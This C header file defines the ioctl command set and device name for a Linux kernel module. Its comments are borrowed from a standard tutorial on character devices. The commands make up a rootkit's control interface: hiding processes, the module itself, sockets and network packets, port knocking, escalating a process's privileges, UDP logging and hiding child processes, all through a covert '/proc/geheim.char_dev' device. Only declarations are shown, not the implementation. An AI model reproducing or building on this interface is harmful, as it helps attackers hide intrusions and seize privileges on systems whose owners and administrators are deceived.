/*  chardev.h - the header file with the ioctl definitions.
 *
 *  The declarations here have to be in a header file, because
 *  they need to be known both to the kernel module
 *  (in chardev.c) and the process calling ioctl (ioctl.c)
 */

#ifndef CHARDEV_H
#define CHARDEV_H

#include <linux/ioctl.h>

/* The major device number */
#define MAJOR_NUM 1002

/*
 "IO": If the command neither reads any data from the user nor writes any data to the userspace.
 "IOW": If the commands needs to write some to the kernel space.
 "IOR": If the command needs to read some thing from the kernel space.
 "IOWR": If the command does both read as well as write from the user

 The definition is done as follows
 #define "ioctl name" __IOX("magic number","command number","argument type")
 */

/* Set the message of the device driver */
#define IOCTL_SET_MSG _IOR(MAJOR_NUM, 0, char *)
/* _IOR means that we're creating an ioctl command
 * number for passing information from a user process
 * to the kernel module.
 *
 * The first arguments, MAJOR_NUM, is the major device
 * number we're using.
 *
 * The second argument is the number of the command
 * (there could be several with different meanings).
 *
 * The third argument is the type we want to get from
 * the process to the kernel.
 */

#define IOCTL_SET_PID_TO_HIDE _IOW(MAJOR_NUM, 5, char *)

#define IOCTL_RM_PID_FROM_HIDE _IOW(MAJOR_NUM, 6, char *)

#define IOCTL_HIDE_MODULE _IOW(MAJOR_NUM, 7, char *)
#define IOCTL_UNHIDE_MODULE _IOW(MAJOR_NUM, 10, char *)

/* port:protocol */
#define IOCTL_HIDE_SOCKET _IOW(MAJOR_NUM, 8, char *)

/* port */
#define IOCTL_UNHIDE_SOCKET _IOW(MAJOR_NUM, 9, char *)

/* packets */
#define IOCTL_HIDE_PACKETS_V4 _IOW(MAJOR_NUM, 11, char *)
#define IOCTL_UNHIDE_PACKETS_V4 _IOW(MAJOR_NUM, 12, char *)
#define IOCTL_HIDE_PACKETS_V6 _IOW(MAJOR_NUM, 13, char *)
#define IOCTL_UNHIDE_PACKETS_V6 _IOW(MAJOR_NUM, 14, char *)

/* port knocking */

#define IOCTL_ENABLE_PORT_KNOCKING _IOW(MAJOR_NUM, 15, char *)
#define IOCTL_DISABLE_PORT_KNOCKING _IOW(MAJOR_NUM, 16, char *)

/* privileged escalation */
#define IOCTL_PRIVILEGE_PROCESS _IOW(MAJOR_NUM, 17, char *)
#define IOCTL_UNPRIVILEGE_PROCESS _IOW(MAJOR_NUM, 18, char *)

/* udp logging */
#define IOCTL_UDP_LOG_ON _IOW(MAJOR_NUM, 19, char *)
#define IOCTL_UDP_LOG_OFF _IOW(MAJOR_NUM, 20, char *)

/* child process hiding */
#define IOCTL_HIDE_CHILDREN_OFF _IOW(MAJOR_NUM, 21, char *)
#define IOCTL_HIDE_CHILDREN_ON _IOW(MAJOR_NUM, 22, char *)

/* The name of the device file */
#define DEVICE_NAME "geheim.char_dev"
#define DEVICE_PATH "/proc/"

#endif
